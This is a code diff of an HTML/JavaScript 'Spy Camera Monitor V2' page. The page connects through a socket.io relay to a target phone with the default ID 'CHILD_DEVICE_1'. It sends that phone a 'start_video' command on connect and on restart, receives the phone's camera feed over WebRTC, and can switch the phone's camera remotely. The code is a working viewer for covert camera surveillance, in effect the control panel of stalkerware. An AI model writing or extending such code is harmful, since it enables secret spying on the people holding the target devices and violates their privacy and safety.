@@ -3,16 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spy Camera Monitor</title>
+    <title>Spy Camera Monitor V2</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
     <style>
-        /* --- PHONE STYLE UI --- */
+        /* --- PHONE UI STYLE --- */
         body {
-            margin: 0;
-            padding: 0;
-            background-color: #000;
+            margin: 0; padding: 0;
+            background-color: #121212;
             color: white;
-            font-family: sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -20,138 +19,158 @@
             overflow: hidden;
         }
 
-        /* Phone Frame */
         .phone-frame {
             position: relative;
-            width: 100%;
-            height: 100%;
-            max-width: 480px; /* Mobile width limit */
+            width: 100%; height: 100%;
+            max-width: 480px;
             max-height: 850px;
             background: #000;
-            overflow: hidden;
             border-radius: 0px;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+            box-shadow: 0 0 30px rgba(0, 150, 255, 0.3);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
         }
 
         @media (min-width: 500px) {
             .phone-frame {
                 border-radius: 30px;
-                border: 8px solid #333;
+                border: 8px solid #222;
                 height: 90vh;
             }
         }
 
-        /* Video Screen */
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover; /* Full screen fill */
+        /* Video Area */
+        .video-container {
+            flex-grow: 1;
+            position: relative;
             background: #111;
-            transform: scaleX(-1); /* Mirror effect (optional) */
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        /* Top Bar (Status) */
+        video {
+            width: 100%; height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1); /* Mirror view */
+        }
+
+        /* Loading / Status Text */
+        .status-overlay {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 5;
+            pointer-events: none;
+            display: block;
+        }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.1);
+            border-left-color: #00a8ff;
+            border-radius: 50%;
+            width: 40px; height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        /* Top Bar */
         .top-bar {
             position: absolute;
-            top: 20px;
-            left: 0;
-            width: 100%;
-            text-align: center;
+            top: 0; left: 0; width: 100%;
+            padding: 15px 0;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.8), transparent);
             z-index: 10;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.6), transparent);
-            padding-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            box-sizing: border-box;
         }
 
         .status-badge {
-            background: rgba(255, 0, 0, 0.7);
-            padding: 5px 15px;
+            background: #ff4444;
+            padding: 5px 12px;
+            border-radius: 15px;
+            font-size: 11px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+        .status-badge.online { background: #00C851; color: black; }
+
+        .btn-reconnect {
+            background: #00a8ff;
+            border: none;
+            color: white;
+            padding: 8px 15px;
             border-radius: 20px;
             font-size: 12px;
             font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0, 168, 255, 0.3);
         }
-
-        .status-badge.online {
-            background: rgba(0, 255, 0, 0.7);
-            color: black;
-        }
+        .btn-reconnect:active { transform: scale(0.95); }
 
         /* Bottom Controls */
         .controls {
-            position: absolute;
-            bottom: 30px;
-            width: 100%;
+            height: 120px;
+            background: rgba(0,0,0,0.8);
             display: flex;
             justify-content: space-around;
             align-items: center;
             z-index: 10;
-            padding-bottom: 10px;
+            padding-bottom: 20px;
         }
 
-        /* Switch Cam Button */
         .btn-switch {
-            width: 50px;
-            height: 50px;
-            background: rgba(255, 255, 255, 0.2);
+            width: 60px; height: 60px;
+            background: rgba(255,255,255,0.15);
             border-radius: 50%;
             border: none;
             cursor: pointer;
             display: flex;
-            align-items: center;
             justify-content: center;
-            transition: 0.2s;
+            align-items: center;
         }
-        .btn-switch:active { transform: scale(0.9); background: rgba(255, 255, 255, 0.4); }
-        
-        .icon-switch {
-            width: 24px;
-            height: 24px;
-            border: 2px solid white;
-            border-radius: 5px;
-            position: relative;
-        }
-        .icon-switch::after {
-            content: '↺';
-            position: absolute;
-            top: -6px;
-            left: 4px;
-            font-size: 20px;
-            color: white;
-            font-weight: bold;
-        }
+        .btn-switch:active { background: rgba(255,255,255,0.3); }
+        .icon-switch { font-size: 24px; }
 
-        /* Device Input Overlay (Start Screen) */
+        /* Login Overlay */
         #login-overlay {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9);
-            z-index: 20;
+            background: #000;
+            z-index: 100;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
         }
-
+        
         input {
-            padding: 10px;
-            border-radius: 5px;
-            border: 1px solid #444;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #333;
             background: #222;
             color: white;
             text-align: center;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
             font-size: 16px;
+            width: 70%;
         }
 
         button.start-btn {
-            padding: 10px 20px;
-            background: #007bff;
+            padding: 12px 30px;
+            background: #00C851;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 30px;
             font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
+            box-shadow: 0 0 15px rgba(0, 200, 81, 0.4);
         }
 
     </style>
@@ -161,27 +180,29 @@
     <div class="phone-frame">
         
         <div id="login-overlay">
-            <h3>Spy Monitor</h3>
-            <p style="color: #aaa; font-size: 12px; margin-bottom: 20px;">Enter Target Device ID</p>
-            <input type="text" id="targetId" value="CHILD_DEVICE_1" placeholder="Enter Device ID">
-            <button class="start-btn" onclick="startMonitor()">CONNECT</button>
+            <h2 style="margin-bottom: 10px;">Spy Monitor</h2>
+            <p style="color: #888; font-size: 13px; margin-bottom: 30px;">Enter Target Device ID</p>
+            
+            <input type="text" id="targetId" placeholder="CHILD_DEVICE_1">
+            <button class="start-btn" onclick="saveAndConnect()">CONNECT</button>
         </div>
 
         <div class="top-bar">
-            <span id="status" class="status-badge">Waiting...</span>
+            <span id="status" class="status-badge">Offline</span>
+            <button class="btn-reconnect" onclick="restartConnection()">⚡ RESTART</button>
         </div>
 
-        <video id="remoteVideo" autoplay playsinline muted></video>
+        <div class="video-container">
+            <div id="loader" class="status-overlay">
+                <div class="spinner"></div>
+                <span style="font-size:12px; color:#aaa;">Waiting for video...</span>
+            </div>
+            <video id="remoteVideo" autoplay playsinline muted></video>
+        </div>
 
         <div class="controls">
-            <div style="width: 40px; height: 40px; background: #333; border-radius: 5px;"></div>
-
-            <div style="width: 70px; height: 70px; border: 4px solid white; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
-                <div style="width: 60px; height: 60px; background: red; border-radius: 50%;"></div>
-            </div>
-
             <button class="btn-switch" onclick="switchCamera()">
-                <div class="icon-switch"></div>
+                <span class="icon-switch">🔄</span>
             </button>
         </div>
     </div>
@@ -189,62 +210,124 @@
     <script>
         // ✅ SERVER CONFIGURATION
         const SOCKET_URL = "https://child-v9no.onrender.com"; 
-        
+
         let socket;
         let peerConnection;
-        let targetDeviceId = "CHILD_DEVICE_1";
+        let targetDeviceId = "";
         
-        // Google STUN Server (Connectivity ke liye)
         const config = {
             iceServers: [
                 { urls: 'stun:stun.l.google.com:19302' }
             ]
         };
 
-        function startMonitor() {
-            targetDeviceId = document.getElementById("targetId").value.trim();
+        // 1. PAGE LOAD: Check agar ID pehle se saved hai
+        window.onload = function() {
+            const savedId = localStorage.getItem("savedDeviceId");
+            if (savedId) {
+                document.getElementById("targetId").value = savedId;
+                // Auto connect mat karo, user ko Connect dabane do taaki wo ready ho
+            }
+        };
+
+        // 2. CONNECT BUTTON CLICKED
+        function saveAndConnect() {
+            const inputId = document.getElementById("targetId").value.trim();
+            if (!inputId) return alert("Enter Device ID!");
+
+            // ID Save karo
+            targetDeviceId = inputId;
+            localStorage.setItem("savedDeviceId", targetDeviceId);
+
+            // UI Hide karo
             document.getElementById("login-overlay").style.display = 'none';
+            
+            // Connection Start karo
             initSocket();
         }
 
+        // 3. RESTART / RECONNECT BUTTON
+        function restartConnection() {
+            console.log("⚡ Restarting Connection...");
+            updateStatus("Restarting...", false);
+            
+            // Step 1: Sab kuch band karo
+            if (peerConnection) {
+                peerConnection.close();
+                peerConnection = null;
+            }
+            if (socket) {
+                socket.emit('leave', "ADMIN"); // Clean exit (optional)
+            }
+
+            // Step 2: Device ko command bhejo "Video Start Karo"
+            // (Iske liye Android App mein 'command' listener hona chahiye)
+            if (socket && socket.connected) {
+                 // Hum 'send-command' use karenge jo server mein already hai
+                socket.emit('send-command', {
+                    targetId: targetDeviceId,
+                    command: "start_video" // App ko ye command milna chahiye
+                });
+                
+                // Thoda wait karke khud bhi ready ho jao
+                document.getElementById("loader").style.display = 'block';
+            } else {
+                // Agar socket hi disconnected tha, to pura init karo
+                initSocket();
+            }
+        }
+
         function initSocket() {
+            if (socket) socket.disconnect();
+            
             socket = io(SOCKET_URL);
 
             socket.on("connect", () => {
-                console.log("✅ Connected to Server");
-                updateStatus("Connected", true);
-                
-                // Hum 'ADMIN' ban kar join karenge
+                console.log("✅ Socket Connected");
+                updateStatus("Waiting...", false);
                 socket.emit("join-room", "ADMIN");
+
+                // Jaise hi connect ho, Device ko "Wake Up" call bhejo
+                setTimeout(() => {
+                    socket.emit('send-command', {
+                        targetId: targetDeviceId,
+                        command: "start_video"
+                    });
+                }, 1000);
             });
 
-            // 1. OFFER AAYA (Phone se)
+            socket.on("disconnect", () => {
+                updateStatus("Socket Offline", false);
+            });
+
+            // 📡 OFFER RECEIVED (Main Logic)
             socket.on("offer", async (data) => {
-                console.log("📡 Offer Received");
-                updateStatus("Live Stream", true);
-                
-                // Peer Connection Banao
+                console.log("📡 Offer Received from Device");
+                document.getElementById("loader").style.display = 'none';
+                updateStatus("Online", true);
+
                 createPeerConnection();
 
-                // Remote Description Set Karo
-                await peerConnection.setRemoteDescription(new RTCSessionDescription({
-                    type: "offer",
-                    sdp: data.sdp
-                }));
+                try {
+                    await peerConnection.setRemoteDescription(new RTCSessionDescription({
+                        type: "offer",
+                        sdp: data.sdp
+                    }));
 
-                // Answer Create Karo
-                const answer = await peerConnection.createAnswer();
-                await peerConnection.setLocalDescription(answer);
+                    const answer = await peerConnection.createAnswer();
+                    await peerConnection.setLocalDescription(answer);
 
-                // Answer Wapas Bhejo (Target: Device ID)
-                socket.emit("answer", {
-                    target: targetDeviceId, // "CHILD_DEVICE_1"
-                    type: "answer",
-                    sdp: answer.sdp
-                });
+                    socket.emit("answer", {
+                        target: targetDeviceId,
+                        type: "answer",
+                        sdp: answer.sdp
+                    });
+                } catch (e) {
+                    console.error("Offer Error:", e);
+                }
             });
 
-            // 2. ICE CANDIDATE (Path dhundne ke liye)
+            // ❄️ ICE CANDIDATE
             socket.on("candidate", async (data) => {
                 if (peerConnection) {
                     try {
@@ -253,25 +336,20 @@
                             sdpMid: data.sdpMid,
                             sdpMLineIndex: data.sdpMLineIndex
                         }));
-                    } catch (e) {
-                        console.error("Error adding candidate", e);
-                    }
+                    } catch (e) { console.error("Candidate Error", e); }
                 }
             });
         }
 
         function createPeerConnection() {
             if (peerConnection) peerConnection.close();
-            
             peerConnection = new RTCPeerConnection(config);
 
-            // Jab Video Stream aaye
             peerConnection.ontrack = (event) => {
                 const video = document.getElementById("remoteVideo");
                 video.srcObject = event.streams[0];
             };
 
-            // Jab ICE Candidate mile (Server ko bhejo)
             peerConnection.onicecandidate = (event) => {
                 if (event.candidate) {
                     socket.emit("candidate", {
@@ -283,34 +361,39 @@
                     });
                 }
             };
+            
+            // Agar Connection Fail ho jaye
+            peerConnection.oniceconnectionstatechange = () => {
+                if(peerConnection.iceConnectionState === 'disconnected') {
+                    updateStatus("Disconnected", false);
+                    document.getElementById("loader").style.display = 'block';
+                }
+            };
         }
 
-        // 🔄 SWITCH CAMERA FUNCTION
         function switchCamera() {
-            console.log("🔄 Sending Switch Camera Command...");
             if(socket) {
-                // Server ko bolo ki target device ka camera badle
-                socket.emit("switch-camera", { target: targetDeviceId });
-                
-                // Visual feedback
+                // Button animation
                 const btn = document.querySelector('.btn-switch');
                 btn.style.transform = "rotate(180deg)";
                 setTimeout(() => btn.style.transform = "rotate(0deg)", 300);
+
+                socket.emit("switch-camera", { target: targetDeviceId });
             }
         }
 
         function updateStatus(text, isOnline) {
             const el = document.getElementById("status");
             el.innerText = text;
-            if(isOnline) {
+            if (isOnline) {
                 el.classList.add("online");
-                el.style.backgroundColor = "rgba(0, 255, 0, 0.7)";
-                el.style.color = "black";
+                el.style.backgroundColor = "#00C851"; 
             } else {
-                el.style.backgroundColor = "rgba(255, 0, 0, 0.7)";
+                el.classList.remove("online");
+                el.style.backgroundColor = "#ff4444";
             }
         }
-    </script>
 
+    </script>
 </body>
 </html>
